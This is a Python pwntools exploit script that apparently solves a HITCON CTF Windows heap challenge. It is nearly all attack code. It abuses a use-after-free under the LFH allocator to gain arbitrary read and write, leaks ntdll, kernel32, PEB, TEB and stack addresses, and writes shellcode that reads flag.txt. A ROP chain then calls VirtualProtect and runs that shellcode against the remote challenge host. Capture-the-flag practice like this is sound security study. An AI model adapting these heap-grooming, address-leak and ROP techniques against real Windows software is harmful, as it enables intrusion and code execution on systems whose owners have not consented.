from pwn import *
import time

heap_chunk = 0
target_tid = 0

def add_script(script) -> int:
    proc.sendlineafter(b'choice: ', b'1')
    proc.sendlineafter(b'script: ', script.encode())
    proc.recvuntil(b"index: ")
    return int(proc.recvline().strip())

def add_testcase(index, timeout) -> int:
    proc.sendlineafter(b'choice: ', b'5')
    proc.sendlineafter(b'Index: ', f"{index}".encode())
    proc.sendlineafter(b'timeout: ', f"{timeout}".encode())

    proc.recvuntil(b"index: ")
    return int(proc.recvline().strip())

def delete_testcase(index):
    proc.sendlineafter(b'choice: ', b'6')
    proc.sendlineafter(b'Index: ', f"{index}".encode())

def run_testcase(index):
    proc.sendlineafter(b'choice: ', b'9')
    proc.sendlineafter(b'Index: ', f"{index}".encode())

def set_timer(timeout):
    proc.sendlineafter(b'choice: ', b'10')
    proc.sendlineafter(b'timeout: ', f"{timeout}".encode())

def view_timer():
    proc.sendlineafter(b'choice: ', b'11')
    proc.recvuntil(b"timeout: ")
    timeout = int(proc.recvline().strip())
    proc.recvuntil(b"jsTime: ")
    jsTime = int(proc.recvline().strip())
    proc.recvuntil(b"cppTime: ")
    cppTime = int(proc.recvline().strip())
    return timeout, jsTime, cppTime

def edit_testcase(testcaseIdx, scriptIdx, timeout):
    proc.sendlineafter(b'choice: ', b'7')
    proc.sendlineafter(b'Testcase Index: ', f"{testcaseIdx}".encode())
    proc.sendlineafter(b'Script Index: ', f"{scriptIdx}".encode())
    proc.sendlineafter(b'timeout: ', f"{timeout}".encode())
    
def view_testcase(testcaseIdx):
    proc.sendlineafter(b'choice: ', b'8')
    proc.sendlineafter(b'Testcase Index: ', f"{testcaseIdx}".encode())
    proc.recvuntil(b'Script Index: ')
    scriptIdx = int(proc.recvline().strip())
    proc.recvuntil(b'Timeout: ')
    timeout = int(proc.recvline().strip())
    return scriptIdx, timeout

def arb_write(target_addr, data): # 8 bytes
    global heap_chunk, target_tid
    edit_testcase(0, 3, target_addr - 0x10)
    edit_testcase(target_tid, 3, data)

    # restore timer ptr
    edit_testcase(0, 3, heap_chunk)

def arb_read(target_addr): # 8 bytes
    global heap_chunk, target_tid
    edit_testcase(0, 3, target_addr - 0x10)
    scriptIdx, timeout = view_testcase(target_tid)
    leak = signed2unsigned(timeout, 64)

    # restore timer ptr
    edit_testcase(0, 3, heap_chunk)
    return leak


def signed2unsigned(signed_int, size):
    if (signed_int >= 0):
        return signed_int
    else:
        return (signed_int+2**size) & 0xffffffff

# To check if LFH is enabled or not, use `!heap -x address`
def exploit():
    global heap_chunk, target_tid

    # enable LFH
    for i in range(18):
        sid = add_script("console.log(Timer);".ljust(0x100-0x18, " "))
    
    # fill UserBlock
    # Not so sure how many alloc is required   
    for i in range(27-2):
        sid = add_script("console.log(Timer);".ljust(0x100-0x18, " "))

    tid = add_testcase(0, 100)
    run_testcase(0)
    proc.recvuntil(b"js: QQTimer(")
    heap_chunk = int(proc.recvline().strip()[2:-1], 16)
    heap_base = (heap_chunk & ~0xffff) -0x20000
    print("[+] QQTimer addr: ", hex(heap_chunk))
    print("[+] heap_base: ", hex(heap_base))
    input("@")

    # make the hole
    delete_testcase(0) # by releasing engine, only delete timer instead of testcase
    input("@")

    '''
    struct QQTimer {
        int timeout; //0x10
        QElapsedTimer* timer; 0x18
        int jsTime; // 0x20
        int cppTime; // 0x24
    }
    struct QQTestcase {
        QQTimer* myTimer; // 0x10
        QJSEngine* myEngine; //0x18
        int scriptId; //0x20
        int used; //0x24
    }
    '''    
    
    # fill the hole 
    # I found that the heap spray is not very stable to locate the overlapped chunk
    # So I alloc many times to ensure that I can get the overlapped chunk
    # And this works! The exploit become much more stable than before. 
    for i in range(0x20):
        tid = add_testcase(i+1, 1000+i) # timeout value is not important, becuz it will overwrite testcase->timer->timeout over and over again
        print("[+] testcase id: ", tid)
    input("@")

    timeout, jsTime, cppTime = view_timer()
    print(timeout, jsTime, cppTime)
    target_tid = cppTime-1
    if (target_tid < 0):
        raise Exception("LFH Failed!")
    print("[+] overlaped testcase id: ", target_tid)
    input("@")

    # valid testcase id is correct
    edit_testcase(0, 3, heap_chunk) # testcase id:0 is probably independent! use non-overlapped testcase fix the testcase->timer ptr
    scriptIdx, timeout = view_testcase(target_tid)
    # print(scriptIdx, hex(signed2unsigned(timeout, 64)))
    input("@")

    # arb read
    heap_lock = heap_base + 0x2c0 # _HEAP->LockVariable->Lock
    leak_addr = arb_read(heap_lock)
    # ntdll_base = leak_addr - 0x16ae70 # win10
    # ntdll_base = leak_addr - 0x171eb0 # server2022
    ntdll_base = leak_addr - 0x172eb0 # GCP
    print("[+] leak_addr:", hex(leak_addr))
    print("[+] ntdll_base:", hex(ntdll_base))
    input("@")


    # leak image base from ntdll!PebLdr
    # ntdll_peb_ldr = ntdll_base + 0x16c4c0 # win10
    # ntdll_peb_ldr = ntdll_base + 0x173100 # server2022
    ntdll_peb_ldr = ntdll_base + 0x174100 # GCP

    immol = arb_read(ntdll_peb_ldr + 0x20) # ntdll!_PEB_LDR_DATA->InMemoryOrderModuleList
    print("[+] immol:", hex(immol))

    image_base = arb_read(immol + 0x28) - 0x3ccc
    print('[+] image_base: ', hex(image_base))
    input("@")

    # leak kernel32.dll base
    iat = image_base + 0x5000  # check by CFF Explorer
    GetSystemTimeAsFileTimeStub_addr = arb_read(iat+ 0x8)
    # kernel32_base = GetSystemTimeAsFileTimeStub_addr - 0x18310 # win10
    # kernel32_base = GetSystemTimeAsFileTimeStub_addr - 0x18680 # server2022
    kernel32_base = GetSystemTimeAsFileTimeStub_addr - 0x18c50 # GCP
    print('[+] kernel32_base: ', hex(kernel32_base))


    # winexec_addr = kernel32_base + 0x67780 # win10
    winexec_addr = kernel32_base + 0x1280 # server2022 # GCP

    # readfile_addr = kernel32_base + 0x23d50 # server2022
    readfile_addr = kernel32_base + 0x24320 # GCP


    # writefile_addr = kernel32_base + 0x25750 # win10
    # writefile_addr = kernel32_base + 0x23e40 # server2022
    writefile_addr = kernel32_base + + 0x24410 # GCP
    
    # createfile_addr = kernel32_base + 0x252d0 # win10 # kernel32!CreateFileA
    # createfile_addr = kernel32_base + 0x239a0 # server2022
    createfile_addr = kernel32_base + 0x23f70 # GCP

    # virtualprotect_addr = kernel32_base + 0x1c3f0 # win10 # kernel32!VirtualProtectStub
    # virtualprotect_addr = kernel32_base + 0x1b990 # server2022
    virtualprotect_addr = kernel32_base + 0x1bf60 # GCP

    input("@")

    # leak stack
    # peb = arb_read(ntdll_base + 0x16c428) - 0x240 #win10
    # peb = arb_read(ntdll_base + 0x173068) - 0x240 #server2022
    peb = arb_read(ntdll_base + 0x174068) - 0x240 # GCP

    teb = peb + 0x1000
    stack_base = arb_read(teb+0x11) << 8
    stack_end = stack_base + (0x10000 - (stack_base & 0xffff))
    print('[+] peb: ', hex(peb))
    print('[+] teb: ', hex(teb))
    print('[+] stack_base: ', hex(stack_base))
    input("@")

    process_parameter = arb_read(peb + 0x20)
    stdin = arb_read(process_parameter + 0x20)
    stdout = arb_read(process_parameter + 0x28)
    print('[+] stdin: ', hex(stdin))
    print('[+] stdout: ', hex(stdout))
    input("@")


    # find ret address in the stack
    rop_target_addr = 0
    ret_addr = image_base + 0x3c5c # main's caller
    start_addr = stack_end - 8
    for i in range(0x200):
        time.sleep(0.5)
        _addr = start_addr - 8*i
        if arb_read(_addr) == ret_addr:
            rop_target_addr = _addr
            print(f'[*] Found return address at {hex(rop_target_addr)}')
            break
    input("@")

    # The address to store the shellcode
    shellcode_addr = image_base + 0x93a0

    # I take the shellcode & rop form Jack's blog (ref: https://jackgrence.github.io/HITCON-CTF-2019-dadadb-Writeup/)
    # Prepare shellcode 
    shellcode = f'''
        jmp readflag
    flag:
        pop r11
    createfile:
        mov qword ptr [rsp + 0x30], 0
        mov qword ptr [rsp + 0x28], 0x80
        mov qword ptr [rsp + 0x20], 3
        xor r9, r9
        mov r8, 1
        mov rdx, 0x80000000
        mov rcx, r11
        mov rax, {createfile_addr}
        call rax
    readfile:
        mov qword ptr [rsp + 0x20], 0
        lea r9, [rsp + 0x200]
        mov r8, 0x100
        lea rdx, [rsp + 0x100]
        mov rcx, rax
        mov rax, {readfile_addr}
        call rax
    writefile:
        mov qword ptr [rsp + 0x20], 0
        lea r9, [rsp + 0x200]
        mov r8, 0x100
        lea rdx, [rsp + 0x100]
        mov rcx, {stdout}
        mov rax, {writefile_addr}
        call rax
    loop:
        jmp loop
    readflag:
        call flag
    '''
    shellcode = (asm(shellcode) + b'flag.txt\x00').ljust(0x100, b'\x90') 
    print(f"[+] shellcode size: {len(shellcode)}")

    for i in range(len(shellcode)//8):
        _bytes = shellcode[i*8:(i+1)*8]
        _bytes = int.from_bytes(_bytes, byteorder='little', signed=True)
        arb_write(shellcode_addr + (i*8), _bytes)
    print(f"[+] shellcode is written to {hex(shellcode_addr)}")
    input("@")

    
    '''
    BOOL ReadFile(
        [in]                HANDLE       hFile,
        [out]               LPVOID       lpBuffer,
        [in]                DWORD        nNumberOfBytesToRead,
        [out, optional]     LPDWORD      lpNumberOfBytesRead,
        [in, out, optional] LPOVERLAPPED lpOverlapped
    );
    
    BOOL VirtualProtect(
        [in]  LPVOID lpAddress,
        [in]  SIZE_T dwSize,
        [in]  DWORD  flNewProtect,
        [out] PDWORD lpflOldProtect
    );

    '''


    # ROP
    # pop_rdx_rcx_r8_r9_r10_r11 = ntdll_base + 0x8c691 # win10
    # pop_rdx_rcx_r8_r9_r10_r11 = ntdll_base + 0x8dfb0 # server2022
    pop_rdx_rcx_r8_r9_r10_r11 = ntdll_base + 0x8ea50 # GCP
    rop_gadgets = [
        pop_rdx_rcx_r8_r9_r10_r11,
        0x1000,                     # rdx
        shellcode_addr & ~0xfff,    # rcx
        0x40,                       # r8
        rop_target_addr + 0x100 - 8,# r9
        0,                          # r10 
        11,                         # r11
        virtualprotect_addr, 
        shellcode_addr
    ]

    # The elements in ROP gadget list must be 8 bytes 
    for i, _gadget in enumerate(rop_gadgets):
        print(f"idx: {i}, gadget: {hex(_gadget)}")
        arb_write(rop_target_addr + (i*8), _gadget)

    # print flag.txt
    proc.sendlineafter(b'choice: ', b'12')

if __name__ == '__main__':
    context.arch = 'amd64'
    proc = remote("chal-qqq.chal.hitconctf.com", 41870) # GCP
    exploit()
    proc.interactive()

